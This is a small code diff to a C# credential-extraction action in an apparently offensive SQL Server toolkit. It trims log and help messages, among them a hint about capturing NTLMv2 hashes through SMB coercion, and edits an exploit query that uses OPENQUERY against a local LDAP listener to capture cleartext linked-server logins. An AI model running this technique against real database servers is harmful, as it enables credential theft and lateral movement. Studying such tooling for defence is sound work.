@@ -27,7 +27,7 @@ namespace MSSQLand.Actions.Remote
     /// </summary>
     internal class AdsiCredentialExtractor : BaseAction
     {
-        [ArgumentMetadata(Position = 0, Description = "Target ADSI server name (optional - creates temporary server if omitted)")]
+        [ArgumentMetadata(Position = 0, Description = "Target ADSI server name (creates temporary server if omitted)")]
         private string _targetServer = "";
 
         [ExcludeFromArguments]
@@ -62,20 +62,13 @@ namespace MSSQLand.Actions.Remote
                 if (authType == "sql" || authType == "local")
                 {
                     Logger.Warning("Pointless operation: You're directly connected with SQL auth.");
-                    Logger.WarningNested("You already know your own password - there's nothing new to extract.");
-                    Logger.WarningNested("This technique is useful when:");
-                    Logger.WarningNested("  1. Targeting an existing ADSI server with mapped credentials");
-                    Logger.WarningNested("  2. Executing through a linked server chain (extracts the link's login)");
-                    Logger.NewLine();
-                    Logger.Info("Use 'adsi-creds <ADSI_SERVER>' to target an existing ADSI server, or");
-                    Logger.Info("Execute through a link: -l LINKED_SERVER -a adsi-creds");
+                    Logger.WarningNested("You already know your own password");
                     return null;
                 }
                 else if (authType == "windows" || authType == "token" || authType == "entraid")
                 {
                     Logger.Warning("Windows/Token/EntraID authentication uses GSSAPI (no cleartext password).");
                     Logger.WarningNested("This technique only works with SQL authentication.");
-                    Logger.WarningNested("Consider using 'smbcoerce' to capture NTLMv2 hash instead.");
                     return null;
                 }
             }
@@ -200,7 +193,7 @@ namespace MSSQLand.Actions.Remote
                     return null;
                 }
 
-                string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ');";
+                string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ')";
 
                 try
                 {
